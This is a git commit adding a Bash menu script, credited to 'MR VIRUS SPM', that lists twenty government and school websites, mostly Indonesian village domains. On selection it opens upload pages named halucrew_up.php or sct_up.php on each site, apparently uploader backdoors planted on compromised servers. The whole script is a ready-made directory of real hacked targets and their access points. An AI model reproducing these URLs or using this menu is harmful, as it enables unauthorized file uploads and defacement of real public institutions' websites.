3767f24ed0844fa52cc1e8f46c5f7f4617449da3
MrVirusSpm-07 <81134812+MrVirusSpm-07@users.noreply.github.com>
2021-05-23 03:46:09 +0700

    Add files via upload

---
+++ pepes02.sh
@@ -0,0 +1,176 @@
+
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+clear
+echo
+echo $green
+    sleep 1
+          xdg-open https://youtube.com/channel/UCJcJ5ZARYowKSZzgPWSxpcQ
+echo " __  __ ______     _____ ____  _   _ ____ ____  ____  __  __ "
+echo "|  \/  |  _ \ \   / /_ _|  _ \| | | / ___/ ___||  _ \|  \/  |"
+echo "| |\/| | |_) \ \ / / | || |_) | | | \___ \___ \| |_) | |\/| |"
+echo "| |  | |  _ < \ V /  | ||  _ <| |_| |___) |__) |  __/| |  | |"
+echo "|_|  |_|_| \_\ \_/  |___|_| \_\\___/|____/____/|_|   |_|  |_|"
+    sleep 2
+        echo
+            echo $red"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+            echo $red"x     "$ehite"SCRIPT BY MR VIRUS SPM       "$red"x"
+            echo $red"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+        echo
+    sleep 1
+echo $white"PEPES BY ALFAN XPLOIT"
+echo $red"========================"
+    echo
+        echo
+echo $purple"01)." $yellow"pringkuku.kabpacitan.id"
+echo $purple"02)." $yellow"sempu.kabpacitan.id"
+echo $purple"03)." $yellow"piton.kabpacitan.id"
+echo $purple"04)." $yellow"jlubang.kabpacitan.id"
+echo $purple"05)." $yellow"gegeran.kabpacitan.id"
+echo $purple"06)." $yellow"sukodono.kabpacitan.id"
+echo $purple"07)." $yellow"sawahan.kabpacitan.id"
+echo $purple"08)." $yellow"watupatok.kabpacitan.id"
+echo $purple"09)." $yellow"tahunanbaru.kabpacitan.id"
+echo $purple"10)." $yellow"tinatar.kabpacitan.id"
+echo $purple"11)." $yellow"pakisbaru.kabpacitan.id"
+echo $purple"12)." $yellow"donorojo.kabpacitan.id"
+echo $purple"13)." $yellow"kalak.kabpacitan.id"
+echo $purple"14)." $yellow"disperindag.musirawaskab.go.id"
+echo $purple"15)." $yellow"gorkeypublicschool.in"
+echo $purple"16)." $yellow"plumbungan.kabpacitan.id"
+echo $purple"17)." $yellow"wonosobo.kabpacitan.id"
+echo $purple"18)." $yellow"menadi.kabpacitan.id"
+echo $purple"19)." $yellow"bangunsaribandar.kabpacitan.id"
+echo $purple"20)." $yellow"lmpsschool.com"
+    echo
+      echo
+        echo
+sleep 2
+read -p "NOMOR ? =========>  " hat
+if [ $hat = 1 ] || [ $hat = 01 ]
+then
+clear 
+sleep 2
+       xdg-open http://pringkuku.kabpacitan.id//halucrew_up.php
+fi
+if [ $hat = 2 ] || [ $hat = 02 ]
+then
+clear
+sleep 2
+      xdg-open http://sempu.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 3 ] || [ $hat = 03 ]
+then
+clear
+sleep 2
+      xdg-open https://piton.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 4 ] || [ $hat = 04 ]
+then
+clear
+sleep 2
+      xdg-open https://jlubang.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 5 ] || [ $hat = 05 ]
+then
+clear
+sleep 2
+      xdg-open http://gegeran.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 6 ] || [ $hat = 06 ]
+then
+clear
+sleep 2
+      xdg-open https://sukodono.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 7 ] || [ $hat = 07 ]
+then
+clear
+sleep 2
+      xdg-open https://sawahan.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 8 ] || [ $hat = 08 ]
+then
+clear
+sleep 2
+      xdg-open http://watupatok.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 9 ] || [ $hat = 09 ]
+then
+clear
+sleep 2
+      xdg-open http://tahunanbaru.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 10 ]
+then
+clear
+sleep 2
+      xdg-open http://tinatar.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 11 ]
+then
+clear
+sleep 2
+      xdg-open http://pakisbaru.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 12 ]
+then
+clear
+sleep 2
+      xdg-open http://donorojo.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 13 ]
+then
+clear
+sleep 2
+      xdg-open https://kalak.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 14 ]
+then
+clear
+sleep 2
+      xdg-open http://disperindag.musirawaskab.go.id/halucrew_up.php
+fi
+if [ $hat = 15 ]
+then
+clear
+sleep 2
+      xdg-open http://gorkeypublicschool.in/halucrew_up.php
+fi
+if [ $hat = 16 ]
+then
+clear
+sleep 2
+      xdg-open https://plumbungan.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 17 ]
+then
+clear
+sleep 2
+      xdg-open https://wonosobo.kabpacitan.id/halucrew_up.php
+fi
+if [ $hat = 18 ]
+then
+clear
+sleep 2
+      xdg-open https://menadi.kabpacitan.id/sct_up.php
+fi
+if [ $hat = 19 ]
+then
+clear
+sleep 2
+      xdg-open https://bangunsaribandar.kabpacitan.id/sct_up.php
+fi
+if [ $hat = 20 ]
+then
+clear
+sleep 2
+      xdg-open http://lmpsschool.com/sct_up.php
+fi
